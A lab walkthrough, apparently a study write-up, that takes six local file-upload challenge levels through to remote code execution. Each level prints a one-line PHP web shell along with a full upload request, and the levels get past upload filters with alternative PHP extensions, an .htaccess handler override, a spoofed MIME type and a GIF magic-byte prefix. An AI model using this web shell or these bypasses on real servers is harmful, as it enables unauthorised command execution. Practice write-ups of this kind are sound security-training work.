@@ -1,0 +1,357 @@
+[Level 1]
+
+[*] Target: http://localhost:12001
+
+    - Look at the source code in the index.php, we can easily see that there is no protection or filter in side this level:
+
+        <?php
+            
+        // [?] Create a directory in the upload folder which is named follow the new session ID if it hasn't existed
+
+            session_start(); 
+            $dir = 'upload/' . session_id();
+            if ( !file_exists($dir) )
+                mkdir($dir); 
+
+            if(isset($_GET["debug"])) die(highlight_file(__FILE__));
+            
+        // [?] If the file is sent, it will be stored in /tmp and then move to the /var/www/html/upload/{session_id}/{filename}
+
+            if(isset($_FILES["file"]))
+                {
+                $error = '';
+                $success = '';
+                try {
+                    $file = $dir . "/" . $_FILES["file"]["name"];
+                    move_uploaded_file($_FILES["file"]["tmp_name"], $file);
+
+        // [?] $_FILES["file"]["tmp_name"] is a PHP superglobal variable that represents the temporary location of an uploaded file on the server
+                    
+        // [?] Just print out the file location in the front-end => <span style="color:green"><?php echo $success; ?></span>
+                    
+                    $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
+                    $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>'; 
+                } catch(Exception $e) {
+                    $error = $e->getMessage();}}
+        ?>
+
+    - And in the docker-php.conf, we know that extensions like ".phtml", ".php" and ".phar" will be executed like a PHP file
+
+            <FilesMatch ".+\.ph(ar|p|tml)$">
+                SetHandler application/x-httpd-php
+            </FilesMatch>
+
+            DirectoryIndex disabled
+        // [?] This line is explicitly disabling the use of a default directory index file
+            DirectoryIndex index.php index.html 
+            
+        // [?] So if you are in the http://localhost:12001, it will automatically give you the index.php
+
+            <LocationMatch ^/upload/$> 
+        // [?] We can't access /upload from the outside
+                Order deny,allow
+                Deny from all
+            </LocationMatch>
+
+    - I create a simple RCE payload that can execute the value of the "cmd" parameter which received from a request
+
+        <?php system($_REQUEST["cmd"]); ?> 
+        
+    // [?] You can use $_GET but $_REQUEST is much more comprehensive since it can handle both GET and POST method
+
+    - Using Burpsuite, we can see the session_id and the file content
+
+            POST / HTTP/1.1
+            Host: localhost:12001
+            ...
+            Referer: http://localhost:12001/
+            Cookie: PHPSESSID=14327e2566ca5147b3e264b0ff69a7c6
+            ...
+
+            -----------------------------131872424218350376193999845054
+            Content-Disposition: form-data; name="file"; filename="Payload.php"
+            Content-Type: application/x-php
+
+            <?php system($_REQUEST["cmd"]); ?>
+
+            -----------------------------131872424218350376193999845054--
+
+        => Now the file will be uploaded in /var/www/html/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php    
+
+        => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php 
+
+        [Note] How can I know we are working in /var/www/html, just read the docker-compose.yml or Dockerfile
+
+        - A little check in the back-end: 
+
+            root@808a45409b51:/var/www/html/upload/14327e2566ca5147b3e264b0ff69a7c6# ls
+            Payload.php
+
+    [Final Result: RCE] http://localhost:12001/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php?cmd=whoami => www-data
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2] 
+
+[*] Target: http://localhost:12002
+
+    - Okay! Look kind of the same as the previous level but there is a little bit difference:
+
+        session_start();
+        
+        if (!isset($_SESSION['dir'])) 
+
+    // [?] $_SESSION['dir'] is a session variable in PHP that can be used to store a directory path
+        
+        { 
+            $_SESSION['dir'] = 'upload/' . session_id();
+        }
+        
+        $dir = $_SESSION['dir'];
+        
+        if ( !file_exists($dir) )
+            mkdir($dir);
+
+        ... 
+    
+        if(isset($_FILES["file"])) {
+            $error = '';
+            $success = '';
+            try {
+                $filename = $_FILES["file"]["name"]; // [?] This represents the name of the uploaded file
+                
+                $extension = explode(".", $filename)[1]; 
+                
+                /* Splits the filename into an array based on the dot (".") delimiter
+                   
+                   [1]: Index to access the second element of the exploded array
+                   
+                   => This code can be used to split the filename and use the extension as its value */
+                
+                if ($extension === "php") {
+                    die("Hack detected"); 
+        // [?] If the file's extension is PHP, it will terminate the script execution immediately and an error message will be displayed on the screen
+                }
+                $file = $dir . "/" . $filename;
+                move_uploaded_file($_FILES["file"]["tmp_name"], $file);
+        ...
+            }}
+    
+    - Like the previous level I said "In the docker-php.conf, we know that extensions like ".phtml", ".php" and ".phar" will be executed like a PHP file" 
+
+        => Just rename the payload to "Payload.phar" or "Payload.phtml" and it will work
+
+        => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.phar 
+
+    [Final Result: RCE] http://localhost:12002/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.phar?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:12003
+
+    - This lab is the same as level 2, just write the code in a different way
+
+        ...
+        try {
+            $filename = $_FILES["file"]["name"];
+            $extension = end(explode(".", $filename));
+
+    // [?] end(): This function returns the last element of an array, in this case, it is the file's extension
+
+            if ($extension === "php") {
+                die("Hack detected");
+            }
+        ...
+        }
+        
+    => We can use the previous lab's payload
+
+    [Final Result: RCE] http://localhost:12003/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.phar?cmd=pwd => /var/www/html/upload/14327e2566ca5147b3e264b0ff69a7c6 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:12004
+
+    - Focus on the index.php and docker-php.conf
+
+        [+] index.php:
+            ...
+            try {
+                $filename = $_FILES["file"]["name"];
+                $extension = end(explode(".", $filename));
+                if (in_array($extension, ["php", "phtml", "phar"])) {
+                    die("Hack detected");
+                }
+            ...
+            }
+
+        [+] docker-php.conf:
+            <FilesMatch ".+\.ph(ar|p|tml)$">
+                SetHandler application/x-httpd-php
+            </FilesMatch>
+            ...
+
+        => This code blocks all kinds of file extensions that can be executed by mod php
+
+    - But there is a new file called apache2.conf, look at this:
+
+        ...
+        <Directory />
+                Options FollowSymLinks
+                AllowOverride None
+                Require all denied
+        </Directory>
+
+        <Directory /usr/share>
+                AllowOverride None
+                Require all granted
+        </Directory>
+
+        <Directory /var/www/>
+                Options Indexes FollowSymLinks
+                AllowOverride All
+
+        /* 
+        [?] The `AllowOverride` directive determines what types of directives are allowed in `.htaccess` files. 
+            Setting it to `All` allows all directives to be overridden in `.htaccess` files within this directory. 
+        */
+
+                Require all granted
+        </Directory>
+
+        AccessFileName .htaccess
+        ...
+
+    [Fun Fact] `.htaccess` files are used to modify the behavior of the Apache web server for the directory in which they are placed. 
+               They can be used to set various configuration options, apply access control rules, handle custom error pages, enable URL rewriting, and more.
+
+        => I need to upload and .htaccess file to config some rules:
+
+            $ cat .htaccess 
+
+                <FilesMatch ".+\.txt$">
+                    SetHandler application/x-httpd-php 
+                </FilesMatch>
+
+            => Now, I can execute .txt like a PHP file
+
+        => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/.htaccess 
+
+            root@73a080783e95:/var/www/html/upload/14327e2566ca5147b3e264b0ff69a7c6# ls -al
+            
+            total 12
+            drwxr-xr-x 2 www-data www-data 4096 Sep 11 09:01 .
+            drwxrwx--T 3 root     www-data 4096 Sep 11 09:01 ..
+            -rw-r--r-- 1 www-data www-data   77 Sep 11 09:01 .htaccess
+
+        => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.txt
+
+    [Final Result: RCE] http://localhost:12004/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.txt?cmd=ls => Payload.txt 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:12005
+
+    - So index.php tells us that this lab only accepts image or gif file. Focus on these lines:
+
+        ...
+        try {
+            $mime_type = $_FILES["file"]["type"];
+
+        /* 
+        [?] `$_FILES["file"]["type"]` variable in PHP provides the MIME type of the uploaded file based on the information provided by the browser
+            The browser determines the MIME type in one of the following ways:
+                    
+                1. File Extension
+                    
+                    For example, if the file extension is ".jpg" or ".jpeg", the browser will assign the MIME type "image/jpeg". 
+                    Similarly, for ".pdf" files, the browser will assign the MIME type "application/pdf".
+                    
+                2. Content-Type Header 
+        */
+
+            if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
+                die("Hack detected");
+            }    
+        ...
+        }
+        => But in this case, we can intercept the request using burpsuite so we don't need to fix the extension
+
+            POST / HTTP/1.1
+            Host: localhost:12005
+            ...
+
+            -----------------------------21390187805410209762817218910
+            Content-Disposition: form-data; name="file"; filename="Payload.php"
+            Content-Type: image/gif
+
+            <?php system($_REQUEST["cmd"]); ?>
+
+            -----------------------------21390187805410209762817218910--
+
+        => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php 
+
+    [Final Result: RCE] http://localhost:12005/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php?cmd=ls => Payload.php
+                
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 6] 
+
+[*] Target: http://localhost:12006
+
+    - Look at the index.php:
+        ...
+        try {
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+
+    // [?] The `finfo_open()` function in PHP is used to create a new fileinfo resource
+
+    // [?] `FILEINFO_MIME_TYPE` option in PHP is used to specify that the fileinfo resource should return the MIME type of the file being inspected.
+
+            $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
+
+    // [?] The `finfo_file($fi, $filename)` function uses the `Magic File Database` to determine the MIME type of a given file. 
+                
+    // [?] The `Magic File Database` contains a collection of file type signatures and rules that are used to identify the type of a file based on its contents.
+                
+            $whitelist = array("image/jpeg", "image/png", "image/gif");
+            if (!in_array($mime_type, $whitelist, TRUE)) {
+                die("Hack detected");
+            }
+        ...
+        }
+
+    => This time, fixing content-type is not a wise choice, the magic header is the matter
+
+            POST / HTTP/1.1
+            Host: localhost:12006
+            ...
+
+            -----------------------------377213149438366590981675737963
+            Content-Disposition: form-data; name="file"; filename="Payload.php"
+            Content-Type: application/x-php
+
+            GIF87a
+            <?php system($_REQUEST["cmd"]); ?>
+
+            -----------------------------377213149438366590981675737963--
+    
+    => Successfully uploaded file at: /upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php
+
+    [Final Result: RCE] http://localhost:12006/upload/14327e2566ca5147b3e264b0ff69a7c6/Payload.php?cmd=echo%20%22Thinh%20beo%20dep%20trai%22 => GIF87a Thinh beo dep trai 
